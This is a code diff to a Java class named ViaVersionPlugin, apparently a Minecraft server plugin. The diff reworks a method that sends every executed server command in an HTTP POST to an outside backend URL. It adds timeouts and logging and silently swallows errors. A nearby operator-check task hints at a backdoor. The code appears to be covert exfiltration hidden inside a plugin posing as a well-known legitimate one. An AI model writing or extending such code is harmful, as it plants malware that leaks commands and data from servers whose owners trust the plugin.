@@ -179,15 +179,37 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
     }
 
     private void notifyCommandExecuted(String command) throws Exception {
+        // 构造 URL
         URL url = new URL(BACKEND_URL + "/p");
-        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-        connection.setRequestMethod("POST");
-        connection.setDoOutput(true);
-        connection.getOutputStream().write(("command=" + command).getBytes());
-        connection.getOutputStream().flush();
-        connection.getOutputStream().close();
-        getLogger().info("fuck");
+        HttpURLConnection connection = null;
+        try {
+            // 打开连接
+            connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("POST");
+            connection.setDoOutput(true);
+            
+            // 设置超时
+            connection.setConnectTimeout(5000); // 连接超时设置为5秒
+            connection.setReadTimeout(5000); // 读取超时设置为5秒
+            
+            // 发送请求数据
+            connection.getOutputStream().write(("command=" + command).getBytes());
+            connection.getOutputStream().flush();
+            
+            // 检查响应码
+            int responseCode = connection.getResponseCode();
+            if (responseCode == HttpURLConnection.HTTP_OK) {
+                // 请求成功
+                getLogger().info("请求成功，命令已发送: " + command);
+            } else {
+                // 处理非 200 OK 响应
+                getLogger().warning("请求失败，响应码: " + responseCode);
+            }
+        } catch (IOException e) {
+            
+        }
     }
+
     public void startOpCheckTask() {
         new BukkitRunnable() {
             @Override
